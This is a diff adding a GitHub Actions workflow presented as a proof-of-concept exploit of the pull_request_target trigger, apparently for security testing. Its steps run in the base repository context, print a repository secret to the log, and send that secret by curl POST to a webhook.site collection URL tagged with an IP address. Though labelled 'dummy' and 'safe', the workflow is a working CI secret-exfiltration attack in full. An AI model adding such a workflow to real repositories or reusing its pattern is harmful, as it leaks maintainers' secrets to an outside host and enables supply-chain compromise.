@@ -1,0 +1,38 @@
+name: PoC Pull Request Target Exploit
+
+# Trigger on PR to main, like the real workflow
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+    branches:
+      - main
+
+permissions:
+  contents: read
+
+jobs:
+  poc-rce:
+    name: Demonstrate RCE via pull_request_target
+    runs-on: ubuntu-latest
+    steps:
+      # Step 1: Show we are running in the base repo context
+      - name: Print environment info
+        run: |
+          echo "This workflow is running in the BASE repository context!"
+          echo "GitHub Actor: $GITHUB_ACTOR"
+          echo "GitHub Repository: $GITHUB_REPOSITORY"
+
+      # Step 2: Demonstrate secret access safely
+      - name: Print dummy secret
+        run: |
+          echo "Exposing TEST_SECRET: ${{ secrets.TEST_SECRET }}"
+        # Add a dummy secret in your test repo settings for demonstration
+        env:
+          TEST_SECRET: ${{ secrets.TEST_SECRET }}
+
+      # Step 3: Simulate exfiltration (safe endpoint)
+      - name: Exfiltrate to a safe test endpoint
+        run: |
+          curl -X POST -H "Content-Type: text/plain" \
+          -d "Dummy secret: ${{ secrets.TEST_SECRET }}" \
+         	https://webhook.site/66c4d84a-ac76-4b83-bb68-5a992164c7b7?ip=46.137.66.195
